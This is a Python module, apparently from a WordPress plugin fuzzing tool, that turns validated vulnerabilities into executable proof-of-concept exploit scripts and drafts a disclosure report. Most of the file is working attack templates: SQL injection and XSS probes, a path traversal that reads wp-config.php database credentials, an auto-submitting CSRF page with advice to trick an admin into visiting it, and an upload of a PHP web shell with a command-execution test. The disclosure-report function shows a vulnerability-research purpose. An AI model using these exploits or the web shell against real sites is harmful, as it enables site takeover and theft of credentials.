"""Generates proof-of-concept exploits from validated vulnerabilities."""

import os
from typing import Optional
from .models import ValidatedVulnerability


class PoCGenerator:
    """Generates proof-of-concept exploits."""

    def __init__(self, output_dir: str = "fuzz_results/exploits"):
        """
        Initialize PoC generator.

        Args:
            output_dir: Directory to save PoC scripts
        """
        self.output_dir = output_dir
        os.makedirs(output_dir, exist_ok=True)

    def generate_poc(self, vulnerability: ValidatedVulnerability) -> str:
        """
        Generate PoC exploit for validated vulnerability.

        Args:
            vulnerability: Validated vulnerability

        Returns:
            str: Path to generated PoC script
        """
        vuln_type = vulnerability.vulnerability_type.lower()

        # Generate PoC based on type
        if 'sql' in vuln_type:
            poc_script = self._generate_sqli_poc(vulnerability)
        elif 'xss' in vuln_type:
            poc_script = self._generate_xss_poc(vulnerability)
        elif 'csrf' in vuln_type:
            poc_script = self._generate_csrf_poc(vulnerability)
        elif 'path' in vuln_type or 'traversal' in vuln_type:
            poc_script = self._generate_path_traversal_poc(vulnerability)
        elif 'auth' in vuln_type:
            poc_script = self._generate_auth_bypass_poc(vulnerability)
        elif 'upload' in vuln_type:
            poc_script = self._generate_file_upload_poc(vulnerability)
        else:
            poc_script = self._generate_generic_poc(vulnerability)

        # Save PoC
        filename = f"{vulnerability.plugin_slug}_{vulnerability.signature_id}_poc.py"
        filepath = os.path.join(self.output_dir, filename)

        with open(filepath, 'w') as f:
            f.write(poc_script)

        os.chmod(filepath, 0o755)

        vulnerability.poc_script_path = filepath

        return filepath

    def _generate_sqli_poc(self, vuln: ValidatedVulnerability) -> str:
        """Generate SQL injection PoC."""
        return f'''#!/usr/bin/env python3
"""
SQL Injection Proof of Concept

Plugin: {vuln.plugin_slug}
Version: {vuln.current_version}
CVE: {vuln.original_cve or "N/A"}
CVSS Score: {vuln.cvss_score}

Description:
{vuln.poc_description or "SQL injection vulnerability"}

Usage:
    python3 poc.py <target_url>

Example:
    python3 poc.py http://target.com/wp-content/plugins/{vuln.plugin_slug}/
"""

import requests
import sys

def exploit(target_url):
    """
    Exploit SQL injection vulnerability.

    Args:
        target_url: Target WordPress site URL
    """
    print(f"[*] Targeting: {{target_url}}")

    # Payload from fuzzing
    payload = {vuln.poc_payload!r}

    print(f"[*] Payload: {{payload}}")

    # Send exploit
    response = requests.post(
        f"{{target_url}}/wp-admin/admin-ajax.php",
        data={{'id': payload}}
    )

    # Check for SQL error
    if any(marker in response.text for marker in ['SQL syntax', 'mysql', 'mysqli']):
        print("[+] SQL Injection Confirmed!")
        print(f"[+] Response contains SQL error markers")
        return True
    else:
        print("[-] No SQL error detected")
        return False

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"Usage: {{sys.argv[0]}} <target_url>")
        sys.exit(1)

    target = sys.argv[1].rstrip('/')
    exploit(target)
'''

    def _generate_xss_poc(self, vuln: ValidatedVulnerability) -> str:
        """Generate XSS PoC."""
        return f'''#!/usr/bin/env python3
"""
Cross-Site Scripting (XSS) Proof of Concept

Plugin: {vuln.plugin_slug}
CVSS Score: {vuln.cvss_score}
"""

import requests
import sys

def exploit(target_url):
    payload = {vuln.poc_payload!r}

    print(f"[*] Testing XSS on: {{target_url}}")
    print(f"[*] Payload: {{payload}}")

    response = requests.get(
        f"{{target_url}}/",
        params={{'search': payload}}
    )

    if payload in response.text:
        print("[+] XSS Confirmed! Payload reflected without escaping")
        return True
    else:
        print("[-] Payload not reflected or escaped")
        return False

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"Usage: {{sys.argv[0]}} <target_url>")
        sys.exit(1)

    exploit(sys.argv[1].rstrip('/'))
'''

    def _generate_csrf_poc(self, vuln: ValidatedVulnerability) -> str:
        """Generate CSRF PoC."""
        return f'''#!/usr/bin/env python3
"""
CSRF Proof of Concept

Plugin: {vuln.plugin_slug}
CVSS Score: {vuln.cvss_score}
"""

def generate_poc_html(target_url):
    """Generate HTML PoC for CSRF."""
    html = f"""
<!DOCTYPE html>
<html>
<head>
    <title>CSRF PoC</title>
</head>
<body>
    <h1>CSRF Proof of Concept</h1>
    <p>This form exploits CSRF vulnerability in {vuln.plugin_slug}</p>

    <form action="{{{{target_url}}}}/wp-admin/admin-ajax.php" method="POST">
        <input type="hidden" name="action" value="malicious_action" />
        <input type="submit" value="Click Me" />
    </form>

    <script>
        // Auto-submit form
        document.forms[0].submit();
    </script>
</body>
</html>
"""
    with open('csrf_poc.html', 'w') as f:
        f.write(html)

    print("[+] CSRF PoC saved to csrf_poc.html")
    print("[+] Host this file and trick admin into visiting it")

if __name__ == "__main__":
    import sys
    if len(sys.argv) < 2:
        print("Usage: python3 poc.py <target_url>")
        sys.exit(1)

    generate_poc_html(sys.argv[1].rstrip('/'))
'''

    def _generate_path_traversal_poc(self, vuln: ValidatedVulnerability) -> str:
        """Generate path traversal PoC."""
        return f'''#!/usr/bin/env python3
"""
Path Traversal Proof of Concept

Plugin: {vuln.plugin_slug}
CVSS Score: {vuln.cvss_score}
"""

import requests
import sys

def exploit(target_url):
    payload = {vuln.poc_payload!r}

    print(f"[*] Testing path traversal on: {{target_url}}")
    print(f"[*] Payload: {{payload}}")

    response = requests.get(
        f"{{target_url}}/",
        params={{'file': payload}}
    )

    # Check for wp-config.php contents
    if 'DB_NAME' in response.text or 'DB_PASSWORD' in response.text:
        print("[+] Path Traversal Confirmed!")
        print("[+] Successfully read wp-config.php")
        print("[+] Database credentials exposed!")
        return True
    else:
        print("[-] No sensitive data found")
        return False

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"Usage: {{sys.argv[0]}} <target_url>")
        sys.exit(1)

    exploit(sys.argv[1].rstrip('/'))
'''

    def _generate_auth_bypass_poc(self, vuln: ValidatedVulnerability) -> str:
        """Generate authentication bypass PoC."""
        return f'''#!/usr/bin/env python3
"""
Authentication Bypass Proof of Concept

Plugin: {vuln.plugin_slug}
"""

import requests
import sys

def exploit(target_url):
    print(f"[*] Testing auth bypass on: {{target_url}}")

    payload = {vuln.poc_payload!r}

    response = requests.get(
        f"{{target_url}}/wp-admin/",
        params=payload
    )

    if 'Dashboard' in response.text or 'wp-admin' in response.text:
        print("[+] Authentication Bypass Confirmed!")
        return True
    else:
        print("[-] Bypass failed")
        return False

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python3 poc.py <target_url>")
        sys.exit(1)

    exploit(sys.argv[1].rstrip('/'))
'''

    def _generate_file_upload_poc(self, vuln: ValidatedVulnerability) -> str:
        """Generate file upload PoC."""
        return f'''#!/usr/bin/env python3
"""
Arbitrary File Upload Proof of Concept

Plugin: {vuln.plugin_slug}
"""

import requests
import sys

def exploit(target_url):
    print(f"[*] Testing file upload on: {{target_url}}")

    # PHP shell
    shell = b"<?php echo shell_exec($_GET['cmd']); ?>"

    files = {{
        'file': ('shell.php', shell, 'application/octet-stream')
    }}

    response = requests.post(
        f"{{target_url}}/wp-admin/admin-ajax.php",
        files=files,
        data={{'action': 'upload'}}
    )

    if response.status_code == 200:
        print("[+] File uploaded successfully!")
        print("[+] Try accessing: {{target_url}}/wp-content/uploads/shell.php?cmd=whoami")
        return True
    else:
        print("[-] Upload failed")
        return False

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python3 poc.py <target_url>")
        sys.exit(1)

    exploit(sys.argv[1].rstrip('/'))
'''

    def _generate_generic_poc(self, vuln: ValidatedVulnerability) -> str:
        """Generate generic PoC."""
        return f'''#!/usr/bin/env python3
"""
Generic Vulnerability Proof of Concept

Plugin: {vuln.plugin_slug}
Type: {vuln.vulnerability_type}
CVSS: {vuln.cvss_score}
"""

import requests
import sys

def exploit(target_url):
    print(f"[*] Testing {{target_url}}")

    payload = {vuln.poc_payload!r}

    response = requests.post(
        f"{{target_url}}/wp-admin/admin-ajax.php",
        data={{'input': payload}}
    )

    print(f"[*] Response: {{response.status_code}}")
    print(response.text[:500])

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python3 poc.py <target_url>")
        sys.exit(1)

    exploit(sys.argv[1].rstrip('/'))
'''

    def generate_disclosure_report(self, vulnerability: ValidatedVulnerability) -> str:
        """Generate responsible disclosure report."""
        report = f"""# Vulnerability Disclosure Report

## Summary
{vulnerability.vulnerability_type} vulnerability in {vulnerability.plugin_slug} version {vulnerability.current_version}

## CVSS Score
**{vulnerability.cvss_score}** - {vulnerability.severity if hasattr(vulnerability, 'severity') else 'N/A'}

Vector: `{vulnerability.cvss_vector}`

## Description
{vulnerability.poc_description or "Vulnerability detected via automated fuzzing"}

## Proof of Concept
```
{vulnerability.poc_payload}
```

## Impact
{vulnerability.exploitation_complexity} exploitation complexity

## Recommended Fix
- Implement proper input validation
- Add nonce verification for CSRF protection
- Escape all user inputs before output
- Use prepared statements for database queries

## Validation Method
Validated via automated fuzzing with {vulnerability.unique_crashes} unique crash(es) found.

## Contact
Please respond within 7 days. If no response, this will be escalated to WordPress Security Team.

## Timeline
- Discovery: {vulnerability.validation_date}
- Disclosure: +90 days from acknowledgment
"""

        return report
